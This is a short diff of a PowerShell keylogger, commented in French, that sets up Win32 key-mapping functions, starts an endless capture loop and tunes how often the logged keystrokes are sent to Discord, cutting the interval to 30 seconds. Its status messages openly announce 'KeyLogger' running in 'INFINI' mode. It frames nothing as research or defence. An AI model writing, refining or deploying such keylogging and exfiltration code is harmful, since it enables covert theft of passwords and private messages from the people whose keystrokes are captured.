@@ -36,12 +36,13 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
     $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
 
-    # Variables pour envoyer toutes les 5 minutes
+    # Variables pour envoyer toutes les 30 s
     $lastSendTime = Get-Date
-    $sendInterval = 60  # 5 minutes en secondes
+    $sendInterval = 30
+    Write-Host "KeyLogger demarre en mode INFINI" -ForegroundColor Green
+    Write-Host "Envoi sur Discord toutes les 30 sec" -ForegroundColor Yellow
+     Write-Host "NE PAS " -ForegroundColor Yellow
 
-    Write-Host "KeyLogger demarré en mode INFINI..." -ForegroundColor Green
-    Write-Host "Envoi sur Discord toutes les 5 minutes" -ForegroundColor Yellow
 
     while ($true) {
         # Vérifier s'il faut envoyer les logs
